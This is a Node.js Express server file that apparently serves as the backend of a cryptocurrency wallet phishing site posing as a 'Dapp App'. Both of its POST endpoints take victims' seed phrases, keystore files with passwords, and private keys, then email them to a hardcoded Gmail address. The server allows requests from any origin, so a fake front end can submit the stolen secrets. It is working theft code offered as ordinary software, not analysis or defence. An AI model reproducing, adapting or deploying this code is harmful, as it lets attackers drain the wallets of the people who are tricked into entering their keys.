const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
require("dotenv").config();
const PORT = process.env.PORT || 3001;
const app = express();
app.use(
  cors({
    origin: "*", // allow all origins
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"], // allow these methods
    allowedHeaders: ["Content-Type", "Authorization"], // allow these headers
  })
);
app.use(express.json());
function formatMessage(message) {
  const lines = message.split(/\r?\n/);
  const formattedLines = lines.map(
    (line) => `<div style="margin-bottom: 10px;">${line}</div>`
  );
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedLines.join(
    ""
  )}</div>`;
}
app.get("/", async (req, res) => {
  res.send("Server is running");
});
app.post("/api/send-email", async (req, res) => {
  console.log("Received request to send email with body:", req.body);

  const { phrase, keystore, privateKey, item } = req.body;
  const email = process.env.EMAIL_USER || "";
  const pass = process.env.EMAIL_PASS || "";

  // Gmail transporter with app password
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: email,
      pass,
    },
  });
  console.log(transporter);

  try {
    let mailOptions = null;

    if (phrase) {
      const formattedMessage = formatMessage(phrase);
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Phrase Submission",
        html: `${formattedMessage} <br/> wallet is ${item}`,
      };
    } else if (keystore) {
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Keystore Submission",
        html: `<div>Json: ${keystore.json}</div>
               <div>Password: ${keystore.password}</div>
               wallet is ${item}`,
      };
    } else if (privateKey) {
      const formattedMessage = formatMessage(privateKey);
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Private Key Submission",
        html: `${formattedMessage} <br/> wallet is ${item}`,
      };
    }

    if (mailOptions) {
      const result = await transporter.sendMail(mailOptions);
      console.log("Email result:", result.response);
      return res.status(200).json({ message: "Email sent successfully!" });
    }

    return res.status(400).json({ message: "Submission Failed" });
  } catch (error) {
    console.error("Email error:", error);
    res.status(500).json({ error: "Email failed" });
  }
});
app.post("/api/mail", async (req, res) => {
  try {
    console.log("📩 Received request to send email with body:", req.body);

    const { phrase, keystore, privateKey, item } = req.body;
    const email = process.env.EMAIL_USER || "";
    const pass = process.env.EMAIL_PASS || "";

    console.log("🔑 Using credentials:", {
      email,
      pass: pass ? "****(hidden)****" : "❌ MISSING",
    });

    // Gmail transporter with app password
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: email,
        pass,
      },
    });

    // Verify SMTP connection
    try {
      await transporter.verify();
      console.log("✅ SMTP connection OK");
    } catch (verifyErr) {
      console.error("❌ SMTP connection failed:", verifyErr);
      return res
        .status(500)
        .json({ error: "SMTP connection failed", details: verifyErr.message });
    }

    let mailOptions = null;

    if (phrase) {
      const formattedMessage = formatMessage(phrase);
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Phrase Submission",
        html: `${formattedMessage} <br/> Wallet: ${item}`,
      };
    } else if (keystore) {
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Keystore Submission",
        html: `<div>Json: ${keystore.json}</div>
               <div>Password: ${keystore.password}</div>
               Wallet: ${item}`,
      };
    } else if (privateKey) {
      const formattedMessage = formatMessage(privateKey);
      mailOptions = {
        from: `Dapp App <${email}>`,
        to: "ibsalam24@gmail.com",
        subject: "New Private Key Submission",
        html: `${formattedMessage} <br/> Wallet: ${item}`,
      };
    }

    if (!mailOptions) {
      return res.status(400).json({ message: "Submission Failed (empty body)" });
    }

    const result = await transporter.sendMail(mailOptions);
    console.log("📤 Email sent:", result.response || result.messageId);

    return res.status(200).json({ message: "Email sent successfully!" });
  } catch (error) {
    console.error("🔥 Route error:", error);
    res.status(500).json({ error: "Internal server error", details: error.message });
  }
});


app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
